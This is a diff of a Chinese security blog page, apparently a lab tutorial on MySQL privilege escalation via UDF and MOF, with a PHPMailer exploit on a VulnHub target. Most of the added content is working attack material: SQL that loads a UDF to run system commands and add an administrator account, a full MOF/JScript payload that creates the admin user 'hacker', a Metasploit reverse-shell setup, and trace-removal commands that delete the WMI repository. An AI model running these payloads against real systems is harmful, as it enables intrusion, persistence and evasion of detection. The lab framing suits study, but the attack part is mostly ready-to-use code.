@@ -44,12 +44,15 @@
 <meta property="og:image" content="http://swanq.top/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/14.jpg">
 <meta property="og:image" content="http://swanq.top/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/13.jpg">
 <meta property="article:published_time" content="2021-04-15T12:10:49.000Z">
-<meta property="article:modified_time" content="2021-04-27T02:52:18.072Z">
+<meta property="article:modified_time" content="2021-04-27T13:33:43.497Z">
 <meta property="article:author" content="swanQ">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="mysql">
 <meta property="article:tag" content="提权">
+<meta property="article:tag" content="MOF">
+<meta property="article:tag" content="UDF">
+<meta property="article:tag" content="后渗透">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://swanq.top/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/1.png">
 
@@ -120,7 +123,7 @@
       <h1 class="site-title">SwanQ's blog</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">Deep Love for Cyber Security。</p>
+      <p class="site-subtitle" itemprop="description">强到不会输给任何不讲理的<恶></p>
   </div>
 
   <div class="site-nav-right">
@@ -146,7 +149,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">32</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -156,7 +159,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">11</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">13</span></a>
 
   </li>
   </ul>
@@ -217,7 +220,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-27 10:52:18" itemprop="dateModified" datetime="2021-04-27T10:52:18+08:00">2021-04-27</time>
+                <time title="修改时间：2021-04-27 21:33:43" itemprop="dateModified" datetime="2021-04-27T21:33:43+08:00">2021-04-27</time>
               </span>
 
           
@@ -264,7 +267,7 @@
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/5.png" alt="img"></p>
 <p>MD5解密</p>
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/6.png" alt="img"></p>
-<h3 id="方法二、利用bash脚本自动登陆mysql数据库"><a href="#方法二、利用bash脚本自动登陆mysql数据库" class="headerlink" title="方法二、利用bash脚本自动登陆mysql数据库"></a>方法二、利用bash脚本自动登陆mysql数据库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用一个错误的密码登录1000次目标主机的mysql数据库</span></span><br><span class="line">for ((i = 1; i &lt; 1000; i++)) </span><br><span class="line">do</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">        mysql -h 192.168.127.131 -u root -p111111 -P 3306;</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<h3 id="方法二、利用bash脚本自动登陆mysql数据库"><a href="#方法二、利用bash脚本自动登陆mysql数据库" class="headerlink" title="方法二、利用bash脚本自动登陆mysql数据库"></a>方法二、利用bash脚本自动登陆mysql数据库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用一个错误的密码登录1000次目标主机的mysql数据库</span></span><br><span class="line">for ((i = 1; i &lt; 1000; i++)) </span><br><span class="line">do</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">        mysql -h 192.168.127.131 -u root -p111111 -P 3306;</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.jpg" alt="img"></p>
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.jpg" alt="img"></p>
@@ -274,15 +277,10 @@
 <p>todo:看看mysql 5.5.23的paswword.c出问题的具体位置。</p>
 <h1 id="0x02-UDF-提权"><a href="#0x02-UDF-提权" class="headerlink" title="0x02 UDF 提权"></a>0x02 UDF 提权</h1><p>UDF（user defined function）用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充。</p>
 <p>通过添加UDF导出dll，再mysql中使用UDF以高权限账号执行命令，添加账号进行提权</p>
-<h2 id="1-手动提权："><a href="#1-手动提权：" class="headerlink" title="1.手动提权："></a>1.手动提权：</h2><ul>
+<h2 id="1-提权条件："><a href="#1-提权条件：" class="headerlink" title="1.提权条件："></a>1.提权条件：</h2><ul>
 <li>知道mysql数据库的账户，有对mysql的insert和delete权限，以创建和抛弃函数。</li>
 <li>有可以将动态链接库udf.dll写入相应目录的权限。</li>
 </ul>
-<p>直接查询软件安装目录：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询软件安装目录</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br><span class="line"><span class="comment">-- sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>; <span class="comment">-- 将swanQ加入管理员组</span></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net user swanQ swanQ/add&#x27;</span>); </span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net localgroup administrators swanQ/add&#x27;</span>);   </span><br><span class="line"><span class="comment">-- 清除痕迹:删除函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> cmdshell;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;cmdshell&#x27;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
 <h2 id="2-相关知识点"><a href="#2-相关知识点" class="headerlink" title="2.相关知识点"></a>2.相关知识点</h2><h3 id="1-Secure-file-priv参数"><a href="#1-Secure-file-priv参数" class="headerlink" title="1. Secure_file_priv参数"></a>1. Secure_file_priv参数</h3><p>secure-file-priv参数是用来限制LOAD DATA,SELEC,OUTFILE, LOAD_FILE()传递的指定目录</p>
 <ul>
 <li>值为null ：限制mysql不允许导入导出</li>
@@ -290,11 +288,15 @@
 <li>没有具体值：对mysql的导入导出不做限制</li>
 </ul>
 <p>通过执行<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看secure-file-priv的状态。</p>
-<h3 id="2-UDF提供的函数"><a href="#2-UDF提供的函数" class="headerlink" title="2.UDF提供的函数"></a>2.UDF提供的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-UDF来源"><a href="#3-UDF来源" class="headerlink" title="3.UDF来源"></a>3.UDF来源</h3><p>sqlmap中有windows和Linux32和64位的UDF文件，需要先用sqlmap自带解码工具cloak.py对进行异或的UDF文件进行解码:</p>
+<h3 id="2-UDF来源"><a href="#2-UDF来源" class="headerlink" title="2.UDF来源"></a>2.UDF来源</h3><p>sqlmap和metasploit中有windows和Linux32和64位的UDF文件，需要先用sqlmap自带解码工具cloak.py对进行异或的UDF文件进行解码:</p>
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">路径：</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;63&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py</span><br></pre></td></tr></table></figure>
+
+<p>metasploit的UDF动态链接库文件无需解码，路径如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr/share/metasploit-framework/embedded/framework/data/exploits/mysql</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-UDF提供的函数"><a href="#3-UDF提供的函数" class="headerlink" title="3.UDF提供的函数"></a>3.UDF提供的函数</h3><p>hexdump -C lib_mysqludf_sys_64.so | tail -n +118 | head -n 35</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>
 
 <p>此时已经有了udf文件，接下来就要上传到网站的指定目录</p>
 <ul>
@@ -302,6 +304,11 @@
 <li>当5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)</li>
 <li>当mysql &gt; 5.1，要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数</li>
 </ul>
+<p>接下来就是寻找插件目录并写入动态链接库：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询软件安装目录</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">--查看 mysql 函数里是否新增sys_eval</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行系统命令试试</span></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将swanQ加入管理员组</span></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net user swanQ swanQ/add&#x27;</span>); </span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net localgroup administrators swanQ/add&#x27;</span>);   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清除痕迹:删除函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> cmdshell;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;cmdshell&#x27;</span>  </span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="3-漏洞复现：PHPMailer命令执行利用"><a href="#3-漏洞复现：PHPMailer命令执行利用" class="headerlink" title="3.漏洞复现：PHPMailer命令执行利用"></a>3.漏洞复现：PHPMailer命令执行利用</h2><h3 id="001-环境搭建"><a href="#001-环境搭建" class="headerlink" title="001 环境搭建"></a>001 环境搭建</h3><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/raven/Raven2.ova">靶机下载</a></p>
 <p>攻击机：kali 192.168.127.130</p>
 <p>靶机：Raven 192.168.127.129</p>
@@ -310,15 +317,44 @@
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/11.jpg"></p>
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/12.jpg"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br><span class="line"><span class="meta">#</span><span class="bash"> 定位exp位置</span></span><br><span class="line">locate exploits/php/webapps/40974.py</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 定位exp位置</span></span><br><span class="line">locate exploits/php/webapps/40974.py</span><br></pre></td></tr></table></figure>
 
 <p>更改参数后，运行代码，此时目录下会生成back.php</p>
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/14.jpg"></p>
 <p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/13.jpg"></p>
 <p>开启本地监听，back.php文件运行后shell会成功反弹。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 监听端口</span></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到交互式shell:</span></span><br><span class="line">python -c ’import pty; pty.spawn(&quot;/bin/bash&quot;)’</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 监听端口</span></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到交互式shell:</span></span><br><span class="line">python -c ’import pty; pty.spawn(&quot;/bin/bash&quot;)’</span><br></pre></td></tr></table></figure>
 
-<h1 id="0x03-MOF提权"><a href="#0x03-MOF提权" class="headerlink" title="0x03 MOF提权"></a>0x03 MOF提权</h1><h1 id="0x04-漏洞修复："><a href="#0x04-漏洞修复：" class="headerlink" title="0x04 漏洞修复："></a>0x04 漏洞修复：</h1><p>MySQL数据库更新到最新版本<br>禁止除白名单外其他ip远程登录MySQL数据库<br>修改数据库用户名</p>
+<h1 id="0x03-MOF提权"><a href="#0x03-MOF提权" class="headerlink" title="0x03 MOF提权"></a>0x03 MOF提权</h1><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>MOF(托管对象格式)是windows系统C:/Windows/system32/wbem/mof/nullevt.mof文件，其作用是每间隔5秒就监听进程的创建和死亡。</p>
+<p>如果通过mysql使用load_file将文件写入/wbom/mof。mof中有vbs脚本，可以通过控制脚本内容让系统执行命令来提权。</p>
+<h3 id="2-条件"><a href="#2-条件" class="headerlink" title="2.条件"></a>2.条件</h3><ul>
+<li><p>windows03及以下版本</p>
+</li>
+<li><p>mysql有读写C:/Windows/system32/wbem/mof的权限</p>
+</li>
+<li><p>secure-file-priv参数不为null</p>
+</li>
+</ul>
+<p>msf也自带mof提权模块，且可自动清理痕迹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.127.132</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>mof脚本内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd &#x2F;add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其中核心payload为：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将test.mof写入mof目录下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select load_file(&#39;C:&#x2F;Documents and Settings&#x2F;test.mof&#39;)into dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行成功test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 ,否则在 c:/windows/system32/wbem/bad 目录下</p>
+<p>痕迹清理：</p>
+<p>每隔几分钟会重新执行添加用户的命令，所以想清理痕迹得先暂时关闭 winmgmt 服务再删除mof 文件，此时删除用户才有效果。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line"><span class="built_in">del</span> C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net <span class="built_in">start</span> winmgmt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x04-漏洞修复："><a href="#0x04-漏洞修复：" class="headerlink" title="0x04 漏洞修复："></a>0x04 漏洞修复：</h1><p>MySQL数据库更新到最新版本<br>禁止除白名单外其他ip远程登录MySQL数据库<br>修改数据库用户名</p>
 <p>思考：</p>
 <p>记得是python3跑脚本，不然会遇到python包已安装，但还是找不到的问题。Linux权限管理比Winodws严格，Linux分root用户，组用户和其他用户，然而windows就只有user和administrator。</p>
 <p>参考：</p>
@@ -328,6 +364,7 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> </p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yatere/article/details/7654057">https://blog.csdn.net/yatere/article/details/7654057</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/15321f9ede38">https://www.jianshu.com/p/15321f9ede38</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.xiaoheidiannao.com/8682.html">https://www.xiaoheidiannao.com/8682.html</a></p>
 
     </div>
 
@@ -366,6 +403,9 @@
               <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
               <a href="/tags/mysql/" rel="tag"># mysql</a>
               <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+              <a href="/tags/MOF/" rel="tag"># MOF</a>
+              <a href="/tags/UDF/" rel="tag"># UDF</a>
+              <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag"># 后渗透</a>
           </div>
 
         
@@ -439,7 +479,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-MYSQL%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">0x01 MYSQL漏洞案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">1. 漏洞原理：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">2. 影响版本：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">3. 漏洞复现：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%E3%80%81%E7%94%A8msf%E7%9B%B4%E6%8E%A5%E8%B7%91%EF%BC%9A"><span class="nav-number">1.3.1.</span> <span class="nav-text">方法一、用msf直接跑：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8bash%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E7%99%BB%E9%99%86mysql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.3.2.</span> <span class="nav-text">方法二、利用bash脚本自动登陆mysql数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%E3%80%81Python%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="nav-number">1.3.3.</span> <span class="nav-text">方法三、Python脚本：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-UDF-%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">0x02 UDF 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%89%8B%E5%8A%A8%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">1.手动提权：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.2.</span> <span class="nav-text">2.相关知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Secure-file-priv%E5%8F%82%E6%95%B0"><span class="nav-number">2.2.1.</span> <span class="nav-text">1. Secure_file_priv参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-UDF%E6%8F%90%E4%BE%9B%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.UDF提供的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-UDF%E6%9D%A5%E6%BA%90"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.UDF来源</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9APHPMailer%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">3.漏洞复现：PHPMailer命令执行利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.3.1.</span> <span class="nav-text">001 环境搭建</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-MOF%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">0x03 MOF提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">0x04 漏洞修复：</span></a></li></ol></div>
